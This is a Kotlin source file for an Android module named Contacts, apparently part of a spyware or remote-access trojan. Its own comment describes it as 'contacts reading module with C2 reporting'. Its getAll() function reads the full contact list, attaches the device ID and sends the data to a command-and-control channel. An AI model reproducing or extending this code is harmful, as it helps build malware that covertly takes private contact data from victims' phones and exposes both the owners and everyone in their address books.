// ============================================================
// FILE: android/app/src/main/java/com/xrc/sensors/Contacts.kt
// ============================================================
package com.xrc.sensors

import android.Manifest
import android.content.Context
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity

/**
 * Contacts — contacts reading module with C2 reporting.
 */
class Contacts(
    private val context: Context,
    private val channelClient: ChannelClient
) {
    private val reader = ContactsReader(context)

    fun getAll(): String {
        val contacts = reader.getAll()
        val deviceId = Identity.getDeviceId(context)
        val msg = Message(
            type = Protocol.TYPE_SENSOR_DATA,
            id = "contacts_${System.currentTimeMillis()}",
            device_id = deviceId,
            payload = Protocol.json.encodeToString(
                mapOf("type" to "contacts", "data" to contacts, "count" to contacts.size)
            )
        )
        channelClient.send(msg)
        return Protocol.json.encodeToString(contacts)
    }

    fun search(query: String): List<Map<String, Any>> = reader.search(query)
    fun getCount(): Int = reader.getCount()
    fun hasPermission(): Boolean = context.checkSelfPermission(Manifest.permission.READ_CONTACTS) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
}
